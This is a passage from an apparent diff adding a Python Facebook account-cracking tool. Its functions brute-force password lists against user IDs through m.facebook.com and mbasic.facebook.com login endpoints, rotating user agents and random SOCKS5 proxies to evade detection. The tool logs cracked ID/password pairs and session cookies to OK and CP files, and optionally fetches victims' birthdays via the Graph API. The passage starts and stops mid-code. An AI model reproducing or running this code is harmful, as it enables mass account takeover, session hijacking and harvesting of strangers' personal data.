%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
+					cp+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						nama_ = x["name"]
+						#id_ = x["id"]
+						print("\r %s*--> %s|%s|%s "%(K,uiz,pw,ttl))
+						open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+					cp+=1
+				else:continue
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						coki=po.cookies.get_dict()
+						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						print("\r %s*--> %s|%s|%s "%(H,uiz,pw,ttl))
+						print("\r %s*--> %s "%(H,kuki))
+						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+						ok+=1
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+				else:continue
+				break
+					
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			turu(31)
+	loop+=1
+	
+def mobile_v2(uiz,pwr):
+	global ok,cp,loop
+	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
+	ua = random.choice(ua_crack)
+	ses = requests.Session()
+	runc= random.choice([K,M,U,O,B,H])
+	#randomwar = random.choice(["["+randomly+"•\x1b[0m ]","["+randomly+"•  •\x1b[0m]", "["+randomly+"•  •  •\x1b[0m]", "["+randomly+"■■■■\x1b[0m□□□□□□]", "["+randomly+"■■■■■\x1b[0m□□□□□]", "["+randomly+"■■■■■■\x1b[0m□□□□]", "["+randomly+"■■■■■■■\x1b[0m□□□]", "["+randomly+"■■■■■■■■\x1b[0m□□]", "["+randomly+"■■■■■■■■■\x1b[0m□]", "["+randomly+"■■■■■■■■■■\x1b[0m]"])
+	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
+	for pw in pwr:
+		pw = pw.lower()
+		try:
+			proxff= open('proxy_mat.txt','r').read().splitlines()
+			cuukk=random.choice(proxff)
+			proxs= {'http': 'socks5://'+cuukk}
+			#proxs2= {'http': 'socks4://'+nip}
+			url = "m.facebook.com"
+			headers1= {
+				"Host": url,
+				"cache-control": "max-age=0",
+				"user-agent": ua,
+				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
+				"sec-ch-ua-mobile": "?1",
+				"sec-fetch-site": "same-origin",
+				"sec-fetch-mode": "cors",
+				"sec-fetch-dest": "empty",
+				"sec-fetch-user": "?1",
+				"upgrade-insecure-requests": "1",
+				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			p = ses.get(f"https://{url}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers=headers1)
+			data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
+				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
+				"uid":uiz,
+				"next":f"https://{url}/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
+				"pass":pw,
+				"flow":"login_no_pin"}
+			kuko = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			kuko += " m_pixel_ratio=2.625; wd=412x756"
+			headers2 = {
+				"Host": url,
+				"connection": "keep-alive",
+				"cache-control": "max-age=0",
+				"save-data": "on",
+				"origin": "https://m.facebook.com",
+				"content-type": "application/x-www-form-urlencoded",
+				"user-agent": ua,
+				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				"x-requested-with": "com.facebook.katana",
+				"dnt": "1",
+				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
+				"sec-ch-ua-platform": '"Android"',
+				"sec-ch-ua-mobile": "?1",
+				"sec-fetch-site": "same-origin",
+				"sec-fetch-mode": "cors",
+				"sec-fetch-dest": "empty",
+				"sec-fetch-user": "?1",
+				"upgrade-insecure-requests": "1",
+				"referer": f"https://{url}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
+				"accept-encoding": "gzip, deflate br",
+				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2, cookies={"cookie": kuko}, proxies=proxs, allow_redirects=False)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
+					cp+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						nama_ = x["name"]
+						#id_ = x["id"]
+						print("\r %s*--> %s|%s|%s "%(K,uiz,pw,ttl))
+						open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+					cp+=1
+				else:continue
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						coki=po.cookies.get_dict()
+						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						print("\r %s*--> %s|%s|%s "%(H,uiz,pw,ttl))
+						print("\r %s*--> %s "%(H,kuki))
+						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+						ok+=1
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+				else:continue
+				break
+					
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			turu(31)
+	loop+=1
+	
+def mbasic(uiz,pwr):
+	global ok,cp,loop
+	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
+	ua = random.choice(ua_crack)
+	ses = requests.Session()
+	runc= random.choice([K,M,U,O,B,H])
+	#randomwar = random.choice(["["+randomly+"•\x1b[0m ]","["+randomly+"•  •\x1b[0m]", "["+randomly+"•  •  •\x1b[0m]", "["+randomly+"■■■■\x1b[0m□□□□□□]", "["+randomly+"■■■■■\x1b[0m□□□□□]", "["+randomly+"■■■■■■\x1b[0m□□□□]", "["+randomly+"■■■■■■■\x1b[0m□□□]", "["+randomly+"■■■■■■■■\x1b[0m□□]", "["+randomly+"■■■■■■■■■\x1b[0m□]", "["+randomly+"■■■■■■■■■■\x1b[0m]"])
+	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
+	for pw in pwr:
+		pw = pw.lower()
+		try:
+			proxff= open('proxy_mat.txt','r').read().splitlines()
+			cuukk=random.choice(proxff)
+			proxs= {'http': 'socks5://'+cuukk}
+			#proxs2= {'http': 'socks4://'+nip}
+			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
+					cp+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						nama_ = x["name"]
+						#id_ = x["id"]
+						print("\r %s*--> %s|%s|%s "%(K,uiz,pw,ttl))
+						open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+					cp+=1
+				else:continue
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						coki=po.cookies.get_dict()
+						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						print("\r %s*--> %s|%s|%s "%(H,uiz,pw,ttl))
+						print("\r %s*--> %s "%(H,kuki))
+						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+						ok+=1
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+				else:continue
+				break
+					
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			turu(31)
+	loop+=1
+	
+def free(uiz,pwr):
+	global ok,cp,loop
+	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
+	ua = random.choice(ua_crack)
+	ses = requests.Session()
+	runc= random.choice([K,M,U,O,B,H])
+	#randomwar = random.choice(["["+randomly+"•\x1b[0m ]","["+randomly+"•  •\x1b[0m]", "["+randomly+"•  •  •\x1b[0m]", "["+randomly+"■■■■\x1b[0m□□□□□□]", "["+randomly+"■■■■■\x1b[0m□□□□□]", "["+randomly+"■■■■■■\x1b[0m□□□□]", "["+randomly+"■■■■■■■\x1b[0m□□□]", "["+randomly+"■■■■■■■■\x1b[0m□□]", "["+randomly+"■■■■■■■■■\x1b[0m□]", "["+randomly+"■■■■■■■■■■\x1b[0m]"])
+	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
+	for pw in pwr:
+		pw = pw.lower()
+		try:
+			proxff= open('proxy_mat.txt','r').read().splitlines()
+			cuukk=random.choice(proxff)
+			proxs= {'http': 'socks5://'+cuukk}
+			#proxs2= {'http': 'socks4://'+nip}
